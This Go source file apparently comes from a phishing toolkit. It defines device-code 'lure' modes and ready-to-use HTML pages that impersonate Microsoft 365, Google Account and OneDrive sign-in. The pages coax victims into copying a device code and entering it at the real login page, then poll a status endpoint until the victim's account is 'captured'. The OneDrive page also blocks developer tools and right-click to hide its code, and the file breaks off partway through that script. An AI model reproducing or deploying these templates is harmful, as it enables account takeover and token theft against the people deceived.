package core

import "fmt"

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (default - survives password changes)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="referrer" content="no-referrer">
<title>Microsoft 365 - Secure Access</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;width:100%}
body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f4f8;display:flex;flex-direction:column;min-height:100vh}
.header{background:#0078d4;padding:12px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0}
.header svg{flex-shrink:0}
.header-title{color:#fff;font-size:18px;font-weight:600}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,0.08);width:100%;max-width:440px;padding:40px 48px}
.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.logo svg{flex-shrink:0}
.logo-text{font-size:20px;font-weight:600;color:#1a1a1a}
.intro{text-align:center;color:#323130;font-size:15px;line-height:1.6;margin-bottom:24px}
.info-box{background:#deecf9;border-left:4px solid #0078d4;padding:14px 16px;margin-bottom:24px;font-size:14px;color:#004578;line-height:1.5}
.code-label{font-size:13px;font-weight:600;color:#323130;margin-bottom:8px}
.code-input{width:100%;background:#f3f2f1;border:1px solid #8a8886;border-radius:2px;padding:12px 16px;font-size:24px;font-weight:700;letter-spacing:4px;color:#0078d4;text-align:center;font-family:'Segoe UI Mono',Consolas,monospace;margin-bottom:8px;user-select:all}
.code-input.loading{color:#8a8886;font-size:16px;letter-spacing:normal}
.copy-row{display:flex;justify-content:center;margin-bottom:20px}
.copy-btn{background:#0078d4;color:#fff;border:none;padding:8px 20px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px;transition:background 0.15s}
.copy-btn:hover{background:#106ebe}
.copy-btn.copied{background:#107c10}
.copy-btn svg{width:16px;height:16px;fill:currentColor}
.status{font-size:13px;color:#107c10;text-align:center;margin-bottom:16px;min-height:20px;font-weight:500}
.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px;transition:background 0.15s;margin-bottom:20px}
.btn-primary:hover{background:#106ebe}
.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}
.btn-primary svg{flex-shrink:0}
.security-box{background:#f3f2f1;border-left:4px solid #0078d4;padding:16px;margin-bottom:20px;text-align:center}
.security-box p{font-size:13px;color:#605e5c;line-height:1.5;margin-bottom:12px}
.security-badge{display:inline-flex;align-items:center;gap:6px;background:#0078d4;color:#fff;padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600}
.security-badge svg{width:14px;height:14px;fill:currentColor}
.footer-text{text-align:center;font-size:12px;color:#605e5c;margin-bottom:16px}
.timer{text-align:center;font-size:12px;color:#8a8886}
.timer span{font-weight:600;color:#323130}
.success{display:none;text-align:center;padding:20px 0}
.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.success-icon svg{width:32px;height:32px;fill:#fff}
.success h2{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
.success p{font-size:14px;color:#605e5c;margin-bottom:20px}
.success-badge{display:inline-flex;align-items:center;gap:8px;background:#dff6dd;color:#107c10;padding:10px 20px;border-radius:2px;font-size:14px;font-weight:600}
.success-badge svg{width:18px;height:18px;fill:currentColor}
@media(max-width:500px){.card{padding:32px 24px;border-radius:0}.code-input{font-size:20px;letter-spacing:2px}}
</style>
</head>
<body>
<div class="header">
<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
<span class="header-title">Microsoft 365</span>
</div>

<div class="main">
<div class="card">
<div class="logo">
<svg width="28" height="28" viewBox="0 0 24 24"><rect width="11" height="11" fill="#f25022"/><rect x="13" width="11" height="11" fill="#7fba00"/><rect y="13" width="11" height="11" fill="#00a4ef"/><rect x="13" y="13" width="11" height="11" fill="#ffb900"/></svg>
<span class="logo-text">Microsoft 365</span>
</div>

<div id="mainView">
<p class="intro">Please verify your identity to securely access your Microsoft 365 account.</p>

<div class="info-box">For security reasons, Microsoft requires verification before granting access to your account resources.</div>

<div class="code-label">Verification Code</div>
<div class="code-input" id="userCode">Loading...</div>

<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>

<div class="status" id="codeStatus"></div>

<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
Sign In to Microsoft
</button>

<div class="security-box">
<p>Your account is protected by Microsoft's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Microsoft Secure Platform
</a>
</div>

<p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>

<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>

<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Account Verified</div>
</div>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var verifyUrl='{verify_url}';
var codeReady={code_ready};
var code='{user_code}';
var expiresIn={expires_seconds};
var popup=null;
var codeEl=document.getElementById('userCode');
var statusEl=document.getElementById('codeStatus');
var btnEl=document.getElementById('signInBtn');
var copyBtnEl=document.getElementById('copyBtn');
var copyTextEl=document.getElementById('copyText');
var timerEl=document.getElementById('timerValue');

function showCode(c,v){
code=c;
if(v)verifyUrl=v;
codeEl.textContent=c;
codeEl.classList.remove('loading');
btnEl.disabled=false;
copyBtnEl.disabled=false;
document.getElementById('verifyLink').href=verifyUrl;
}

if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}

function copyCode(){
if(!code)return;
if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}
else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}
}
function showCopied(){
copyBtnEl.classList.add('copied');
copyTextEl.textContent='Copied!';
statusEl.textContent='Code copied to clipboard';
setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);
}
window.copyCode=copyCode;

function openSignIn(){
if(!code)return;
copyCode();
var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
if(popup)popup.focus();
}
window.openSignIn=openSignIn;

function updateTimer(){
if(expiresIn<=0)return;
expiresIn--;
var m=Math.floor(expiresIn/60);
var s=expiresIn%60;
timerEl.textContent=m+':'+(s<10?'0':'')+s;
if(expiresIn>0)setTimeout(updateTimer,1000);
}
if(codeReady)setTimeout(updateTimer,1000);

function poll(){
fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){
if(d.ready&&!codeReady){
codeReady=true;
showCode(d.user_code,d.verify_url);
setTimeout(updateTimer,1000);
}
if(d.captured){
if(popup&&!popup.closed)popup.close();
document.getElementById('mainView').style.display='none';
document.getElementById('successView').style.display='block';
}else if(d.failed){
statusEl.textContent='Session expired. Please refresh to try again.';
statusEl.style.color='#d83b01';
codeEl.textContent='—';
}else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
}).catch(function(){setTimeout(poll,3000);});
}
setTimeout(poll,codeReady?3000:400);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 272 92" width="90" height="30" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#EA4335" d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z"/></svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// OneDrive document access themed page
const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>OneDrive - Secure Access</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA8pJREFUWEfNl1tsFFUYx+fs7M7OdrtbWiiFUqBAoRRKS4sX1BgTjYkaY4wPxgcfTHwwMRofTEw0PviAD8YHE0x8MDE+GKMxahRFjYoKKihC5VIutFDaLbS95bJtd3Znduabn2dmm253Z7u0xJN8mZ2Z/Z/z+853vjOzFv8H">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#0078d4;padding:14px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 4px rgba(0,0,0,0.1)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:600}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:480px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#0078d4}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebfc;border-left:4px solid:#0078d4;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#004578;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#0078d4;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#005a9e;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#005a9e;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6f0;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#0078d4;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#005a9e}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
</head>
<body>
<div class="header">
<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
<span class="header-title">OneDrive</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" width="40" height="40" alt="OneDrive" style="flex-shrink:0">
<span class="logo-text">OneDrive</span>
</div>
<div id="mainView">
<p class="intro">A secure access code has been generated for your shared document.</p>
<div class="info-box">For security reasons, OneDrive requires verification before granting access to shared documents. Use the code below to complete authentication.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
Access Document
</button>
<div class="security-box">
<p>Your document is protected by OneDrive's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
OneDrive Secure Platform
</a>
</div>
<p class="footer-text">If you need assistance, contact your OneDrive administrator.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
